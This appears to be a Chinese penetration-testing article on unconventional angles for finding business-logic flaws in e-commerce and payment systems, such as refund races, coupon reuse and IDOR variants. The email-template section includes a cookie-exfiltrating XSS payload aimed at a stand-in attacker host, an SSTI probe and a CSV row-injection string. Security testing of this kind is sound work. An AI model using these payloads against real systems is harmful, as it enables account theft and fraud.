业务逻辑漏洞的「非对称思维」— 别人想不到的切入点

  标准 checklist 人人都有。真正拉开差距的不是"测了什么"，而是从什么角度去想。以下是七个很少被讨论但极其有效的思维框架。

  ---
  一、「负向思维」— 攻击路径的镜像反转

  所有人都在问"怎么让系统多做一件事"（并发领券、重放支付）。几乎没人问反向问题：

  1.1 撤销 ≠ 回滚

  正向：领券 → 下单 → 支付
  反向：取消订单 → 券退回？积分退回？

  测试点：
  - 取消订单后优惠券回到账户 → 但券的"每人限用一次"计数器是否也回滚？
    → 如果计数器不回滚，券回来后实际"不可用" → 这是正常逻辑
    → 如果计数器也回滚 = 洗券。A取消、B领、A再取消、B再领 → 无限循环

  1.2 退款的"反向精度攻击"

  支付：3件×100元=300元，退款2件 → 退200元

  但如果：退款接口接受小数量？
    退 2.9 件 → 退 290 元 → 但仍保留 3 件商品

  或者：部分退款后"剩余数量"的精度？
    原数量 1，退 0.0000000001
    → 在 int 层 = 退 0 件
    → 在 decimal 层 = 实际退了 0.0000000001
    → 系统认为 "已退部分" → 触发"退货中"状态 → 锁定订单不可再退
    → 但实际上根本没退成
    → 用户既拿了货，订单又处于"退货中"不可操作 = 业务死锁

  1.3 "回退到上一步"的状态污染

  多步流程中，用户点"上一步"修改信息：

  Step1 填地址 → Step2 选支付方式 → 点"上一步"回 Step1 改地址
    → 此时 Step2 的支付方式选择是否保留？
    → 如果保留了 Step2 的状态，但 Step1 修改了订单金额：
      → Step2 的支付金额是旧的还是新的？
      → 如果是旧的 = 可以 Step1 改金额为 1 元，Step2 仍按原金额支付

  ---
  二、「时间轴污染」— 在状态转换的裂缝中注入

  2.1 异步回调的"时间窗口劫持"

  支付流程：用户支付 → 第三方回调 → 订单状态更新

  攻击点不在支付本身，在于：
    T0: 用户发起支付
    T1: 支付完成，第三方发回调到 /callback
    T2: 服务端处理回调 → 标记 paid
    T3: 发送发货指令

  在 T1-T2 之间：如果用户此时取消订单？
    → 取消请求和回调请求并发到达
    → 取消检查 "订单是否 paid" → 否 → 允许取消 → 退款
    → 回调同时标记 "订单 paid" → 发货
    → 结果：退款 + 发货 同时发生

  经典 TOCTOU，但加了第三方异步回调的时间不确定性，窗口比纯并发更大。

  2.2 定时任务的"状态切换窗口"

  很多系统用 Cron Job 做批量状态切换：
    - 每天 0 点把 "待支付" 订单改为 "已取消"
    - 每 5 分钟把 "已发货" 超时订单改为 "已签收"

  攻击点：
    → 在 23:59:59 下单 → 选"货到付款" → 系统认为仍需支付
    → 0:00 Cron 把过期订单改为"已取消"
    → 但不检查 payment_method
    → 货到付款的订单被误取消 → 但物流可能已发出

  2.3 跨天的"当日限额"重置竞态

  每日提现限额 5000 元：
    23:59:59.500: 提现 5000 → 处理中
    23:59:59.800: 提现 5000 → 处理中
    00:00:00.000: Cron 重置限额计数器
    00:00:00.100: 第一笔 5000 完成，扣减计数器 → 余额 0
    00:00:00.200: 第二笔 5000 的限额检查 → 计数器刚重置为 5000 → 通过
    → 当日实际提现 10000

  三、「字段语义劫持」— ID 替换的降维打击

  3.1 同一 ID 在不同接口的"语义不等价"

  经典思维：order_id 只替换为别人的 order_id → IDOR

  非对称思维：同一个 ID 在不同上下文中的"身份"不同：

  接口 A: /api/order/detail?order_id=123  → 返回订单详情
  接口 B: /api/order/cancel?order_id=123   → 取消订单
  接口 C: /api/refund/apply?order_id=123   → 申请退款
  接口 D: /api/coupon/redeem?order_id=123  → ？？？

  问题：接口 D 的 order_id 是"触发用券的订单ID"还是"券归属的订单ID"？
    → 如果是前者：用自己的 order_id 触发别人订单上绑定的券
    → 如果是后者：用自己的券给别人订单用 → 可能套现

  3.2 业务主键 ≠ 安全主键

  发现：`GET /api/invoice/download/123` 返回发票 PDF

  测试：不是枚举 124/125 → 去猜发票号的正向生成规则
    → 发票号 = 年月日 + 6位流水号
    → 20260604000001 → 20260604000002
    → 但这没有惊喜

  真正的非对称测试：
    → 用自己的 order_id 去调用发票下载
    → GET /api/invoice/download?order_id=my_order  → 返回发票
    → 但发票上的买方名称是什么？是谁的订单的发票？
    → 如果发票模块自己维护了一套 ID 体系（invoice_id）
    → 但同时接受 order_id 作为参数
    → order_id → invoice 的映射可能没有再次验证归属

  3.3 复合主键的"半匹配"漏洞

  接口设计：/api/project/{project_id}/task/{task_id}

  权限模型：用户只能访问自己参与的项目

  测试 1（常规）：project_id=我的项目, task_id=别人的任务
    → 如果只检查了 project 归属 → 返回别人任务

  测试 2（非常规）：project_id=别人的项目, task_id=我的任务
    → 后端逻辑：task 属于谁？→ 去查 project → project 没权限 → 403

  测试 3（杀手锏）：把 task 从 A 项目移到 B 项目的瞬态
    → task 的 project_id 字段改了但缓存未刷新
    → project={A的}, task={刚改到B的}
    → 后端查 project 归属 → A 有权限
    → 后端查 task 实际在 → B
    → 如果权限校验用的是 task 的 project_id（A），但返回的数据是 B 的 → 跨项目泄露

  四、「副作用利用」— 不改主流程，吃旁路

  4.1 日志/通知作为信息泄露通道

  不要去打主接口。打旁路：

  短信通知模板：
    "您在{商家名}的订单{订单号}已发货，快递单号{运单号}"
    → 修改 {商家名} 为恶意内容 → XSS/钓鱼
    → 修改 {订单号} 如果包含用户可控制的输入 → 通知系统可能不做输出编码

  邮件模板注入：
    注册用户名设为：<img src="http://attacker/log?cookie=">
    → 注册后系统发欢迎邮件 → 邮件渲染用户名 → 触发图片请求
    → 但这是常规XSS思路

  进阶：
    注册用户名为：{{7*7}}
    → 欢迎邮件用的是服务端模板引擎（如 Jinja2/Velocity）？
    → 如果邮件模板是"在模板引擎里渲染了用户名" → SSTI
    → 而邮件系统通常在内网，SSTI 获得的内网 SSRF 更致命

  4.2 WebSocket 的"心跳注入"

  WebSocket 连接建立后，心跳包通常只是 ping/pong。
  但有些业务实现会在心跳里携带状态同步：

    → {"type":"ping","cart_id":"123","timestamp":"..."}
    → 服务端返回：{"type":"pong","cart_total":100.00,"item_count":3}

  攻击：
    → 修改 ping 里的 cart_id 为他人购物车 ID
    → 心跳变成了定时信息泄露通道
    → 更隐蔽：修改 timestamp 为极大值/负值 → 观察同步行为异常

  4.3 导出功能的"字段拼接"

  导出订单 CSV：
    订单号、商品名、数量、金额、收货地址

  如果商品名中包含换行符：
    商品名 = "正常商品\n99999,admin,1,99999,"
    → CSV 输出变为：
      123,正常商品
      99999,admin,1,99999,,3,100.00,北京市
    → 注入了假行，admin 可能是管理后台导入时的权限字段

  五、「降级链」— 让系统自己降级安全策略

  5.1 触发降级路径

  高并发下很多系统有降级策略：
    - 关闭验签（性能考虑）
    - 关闭风控（减少延迟）
    - 切换到只读缓存（数据可能过期）

  攻击思路：
    → 持续发送低速率请求探测响应时间
    → 当响应突然变快 → 可能进入降级模式
    → 此时发送越权请求 → 降级模式下 Auth 中间件可能被跳过

  实操：
    先创建一笔大订单（包含大量 SKU → 计算量大）
    同时并发大量请求
    → 系统负载上升 → 触发降级
    → 降级后重放之前失败的越权请求

  5.2 多版本 API 的"最弱一环"

  同一功能往往有多个版本：
    /api/v1/order/create
    /api/v2/order/create
    /api/v3/order/create

  常见假设：v3 最安全，v1 最老

  实际测试：
    → v1 可能没有验签、没有金额服务端重算、没有并发锁
    → 但 v1 可能仍然在生产环境可用（"兼容旧客户端"）
    → 用 v1 的参数格式打 v2 的接口？API Gateway 的版本路由可能不一致

  更隐蔽的：
    /internal/order/create（内部服务调用，无鉴权）
    /admin/order/create（管理后台，但路径没被保护）
    /partner/order/create（合作方 API，使用不同的鉴权方式，可能更弱）

  5.3 客户端类型的差异化处理

  User-Agent 不同的响应差异：

    Mobile: {"price":100,"vip_discount":20}
    Web:    {"price":100,"vip_discount":20,"original_price":200}
    MiniApp:{"price":100,"vip_discount":20}

  如果 Mobile 端为了"省流量"：
    → 不返回某些校验字段
    → 或者返回的是简化版，后端处理逻辑不同

  测试方法：
    用 MiniApp 的 UA 发送 Web 端的请求体
    → 后端可能用 MiniApp 的"宽松版"校验逻辑处理 Web 端的数据
    → MiniApp 可能不校验优惠券有效性（因为"在客户端已校验"）

  六、「边界语义」— 在"看起来不可能"的地方找到裂缝

  6.1 支付金额 = 0 不等于"免费"

  金额为 0 时，很多系统走特殊路径：
    "0 元订单" → 不需要调支付网关 → 直接标记 paid

  但如果：
    - 商品价格 100 元
    - 用了一张 100 元优惠券
    - 最终金额 = 0
    - 系统标记 "paid" 但 payment_method = null

  后续：
    - 用户申请退款 → 系统看到 payment_method = null
    - 退款逻辑：退到原支付方式 → 支付方式不存在
    - 有的系统退到"余额" → 0 元订单退 100 元到余额
    - 因为退款计算的是"商品价格"而非"实付金额"

  6.2 "或"逻辑中的权限缝隙

  权限配置：导出报表需要 role=admin 或 部门负责人

  如果一个用户在部门 A 是负责人，但在部门 B 是普通员工：
    → 导出部门 B 的报表 → 后端检查：
      is_admin? → 否
      is_dept_head? → 是（部门 A）
    → 但"是部门负责人"没有限定是"当前报表所属部门的负责人"
    → 通过了全局检查，拿到了不该拿的部门 B 数据

  6.3 分页的"反向遍历"

  常规 IDOR：GET /api/users/1 → /api/users/2 → /api/users/3

  非常规：
    GET /api/users?page=1&size=10&sort=created_at
    → 最后一页的最后一条 → 拿到最早注册用户的完整列表

    GET /api/users?page=-1 → 负数页？
    GET /api/users?size=-1 → 负数大小？
    GET /api/users?size=2147483647 → 一次返回全部？
    GET /api/users?cursor=eyJpZCI6MH0= → base64 解码 = {"id":0} → 改 id 重新编码

  七、「元攻击」— 攻击的不是功能，是"功能的前提假设"

  7.1 假设"用户只有一个身份"

  B2B 系统：一个用户可以属于多个组织

  攻击：
    在组织 A 中创建订单 → 切换到组织 B
    → 组织 B 的订单列表里看不到组织 A 的订单（正确的隔离）
    → 但通过 API 直接用 order_id 访问 → 后端检查：
      "当前用户是否属于订单所属组织？"
    → 如果你从组织 A 的成员列表中删除了自己（或被删除）
    → 订单变成了"所属组织无成员"
    → 再切换到组织 B → 用 order_id 访问
    → 后端：当前用户不在订单所属组织中 → 403
    → 但此时把自己加回组织 A 的邀请链接是否仍有效？
    → 如果仍有效 → 重新加入组织 A → 又能看到订单
    → 但如果组织 A 在你离开期间数据被其他人改了？
    → 竞态 = 你离开时的数据快照 vs 重新加入后的实时数据 → 不一致窗口

  7.2 假设"手机号/邮箱是唯一的"

  系统假设：一个手机号 = 一个账户

  冲破假设：
    → 国际格式：+8613800138000 vs 008613800138000 vs 13800138000
    → 空格变体：13800138000 vs 138 0013 8000
    → 注册同一个手机号的三种格式 → 三个独立账户

  更隐蔽：
    → 先用 "13800138000" 注册账户 A，绑定微信
    → 再用 "+8613800138000" 注册账户 B，绑定支付宝
    → 两个账户"看起来"是不同的手机号
    → 但 SMS 网关都可能发到同一个手机
    → 用账户 A 的身份操作账户 B 的资产？
    → 如果风控关联了两个账户 → 冻结 → 申诉 → 只解冻了其中一个

  7.3 假设"数据库事务等于业务事务"

  技术上的事务 ≠ 业务上的事务：

  数据库事务：
    BEGIN → UPDATE balance → UPDATE order_status → COMMIT
    这是原子的，没问题

  业务事务：
    下单 → 减库存 → 支付 → 减余额 → 发货 → 扣积分
    每一步之间有时间间隔

  攻击点：在两步之间修改"已经被上一步锁定"的数据

    比如：减库存后、支付前 → 修改收货地址
    → 如果地址没有被锁定（下单时只是"快照"了地址）
    → 改成海外地址 → 实际运费不够 → 商家亏运费

    或者：支付后、发货前 → 申请修改 SKU
    → 如果"修改订单"接口在 paid 状态下仍可用
    → 把商品从便宜的改成贵的 → 只付了便宜的价格

  八、实战思维体操：3 个"想不到"的完整攻击推演

  推演 1：「优惠券的"负负得正"」

  前提：
  - 满 100 减 20 优惠券
  - 满 200 减 50 优惠券
  - 系统限制：一个订单只能用一张券

  攻击链：
  1. 下单，选商品 A（价格 100），用满 100 减 20 券 → 应付 80
  2. 修改订单，添加商品 B（价格 100）→ 订单总额变 200
  3. 系统会怎样？
     a. 如果"重新计算优惠"：满 200 应该减 50 → 应付 150 → 好像正常
     b. 如果"不重新计算"：券仍然是减 20 → 应付 180 → 也是正常

  4. 但如果是 b（不重新计算）：
     → 先加商品 B，再删商品 A，再添加商品 A
     → 每次操作是否触发优惠重算？
     → 如果不触发 → 一直保留-20
     → 如果触发但重算逻辑有 bug：
       删的时候不"退券"、加的时候重新"扣券" → 一张券用了两次

  进阶：
  5. 添加商品 C（价格 1000）→ 订单总 1100
  6. 系统检测到"添加高价商品"→ 触发风控审核
  7. 审核过程中订单被锁定
  8. 但优惠券已经"占用"了 → 审核拒绝 → 券退回
  9. 如果退回的券同时还可以在另一个订单中使用（并发操作）
     → 一张券同时挂在了两个订单上

  推演 2：「余额支付 + 混合支付的精度黑洞」

  前提：
  - 余额 100 元
  - 商品 99.99 元
  - 支持"余额+微信"混合支付

  攻击：
  1. 下单 99.99 元，选择混合支付
  2. 余额支付 99.99 → 但是余额精度是"分"，99.99 是精确的
  3. 微信支付 0 元
  4. 系统计算：余额扣 99.99 → OK
  5. 实际调第三方：微信支付 0 元 →
     但微信支付接口不接受 0 元订单 → 返回错误
  6. 系统如何处理？
     a. 把微信的 0 元部分"抹掉" → 全用余额 → 正常
     b. 把整个订单标记为"支付失败" → 但余额已扣 → 退款
     c. 留在"部分支付"状态 → 订单挂起
  7. 如果是 c：挂起的订单 = 余额已扣 99.99，微信待付 0 元
  8. 再发起"取消订单" → 退款 99.99 回余额
  9. 如果退的是"订单总金额"而非"已付金额" → 退 99.99 → 但余额只扣了一次
  10. 结果：余额回来了 99.99 + 原来扣的 99.99 去哪了？

  核心问题：支付状态机有 3 种状态（未付/部分付/已付），但退款逻辑只处理了 2 种

  推演 3：「时间不是单向的 — 时区混淆」

  前提：
  - 限时活动：2026年6月4日 0:00 - 23:59（北京时间 UTC+8）
  - 优惠券：当天有效

  攻击：
  1. 系统服务器在 UTC 时区
  2. 前端 JS 用本地时间判断活动是否生效
  3. 后端用服务器时间（UTC）校验

  在北京时间 6月4日 23:50（UTC 15:50）：
    → 前端：还在活动期内 → 允许提交
    → 后端：UTC 15:50 → 也在活动期内（活动配置是北京时间）

  但在北京时间 6月5日 0:10（UTC 16:10）：
    → 前端：过了活动期 → 按钮置灰
    → 但直接发请求 → 后端用 UTC 时间判断 → 还是 6月4日
    → 活动仍有效！

  更隐蔽的：
    用户手动改手机时区 → 前端显示"活动已结束"
    → 但请求照样发 → 服务端验证用的是哪里的时间？
    → 如果用的是请求中的时间戳 → 可控
